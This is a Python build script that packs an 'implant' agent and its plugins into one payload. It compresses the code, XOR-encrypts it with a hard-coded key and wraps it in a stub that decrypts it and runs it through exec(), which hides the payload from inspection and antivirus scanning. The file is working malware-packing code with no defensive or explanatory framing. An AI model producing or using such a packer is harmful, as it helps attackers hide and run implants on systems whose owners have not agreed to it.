import os
import zlib
import textwrap

# Simple XOR key. In a real scenario, this would be more complex.
XOR_KEY = b"mysecretkey"

def xor_encrypt(data: bytes) -> bytes:
    """Encrypts/Decrypts data using a simple XOR cipher."""
    return bytes([b ^ XOR_KEY[i % len(XOR_KEY)] for i, b in enumerate(data)])

def create_payload():
    """Gathers all agent and plugin code into a single script."""
    payload_code = ""

    # Add agent core
    with open("crawler/implant/agent_core.py", "r") as f:
        payload_code += f.read() + "\n\n"

    # Add plugins
    plugin_dir = "crawler/implant/plugins"
    for filename in os.listdir(plugin_dir):
        if filename.endswith(".py") and filename != "__init__.py":
            with open(os.path.join(plugin_dir, filename), "r") as f:
                payload_code += f.read() + "\n\n"

    # Add the final execution call
    payload_code += "agent = CrawlerAgent()\n"
    payload_code += "agent.run()\n"

    return payload_code

def pack(payload: str, output_file: str):
    """Packs the payload into an encrypted stub."""

    # 1. Compress the payload
    compressed_payload = zlib.compress(payload.encode('utf-8'))

    # 2. Encrypt the compressed payload
    encrypted_payload = xor_encrypt(compressed_payload)

    # 3. Create the stub code
    stub_template = """
import zlib
import textwrap

# --- Payload and Decryption ---
ENCRYPTED_PAYLOAD = {payload_bytes}
XOR_KEY = {key_bytes}

def xor_decrypt(data: bytes) -> bytes:
    return bytes([b ^ XOR_KEY[i % len(XOR_KEY)] for i, b in enumerate(data)])

# --- Main Execution ---
def main():
    decrypted_payload = xor_decrypt(ENCRYPTED_PAYLOAD)
    decompressed_payload = zlib.decompress(decrypted_payload).decode('utf-8')
    exec(decompressed_payload, globals())

if __name__ == "__main__":
    main()
"""

    final_stub = stub_template.format(
        payload_bytes=repr(encrypted_payload),
        key_bytes=repr(XOR_KEY)
    )

    with open(output_file, "w") as f:
        f.write(final_stub)

    print(f"Successfully packed payload into {output_file}")


if __name__ == "__main__":
    payload_string = create_payload()
    pack(payload_string, "packed_agent.py")
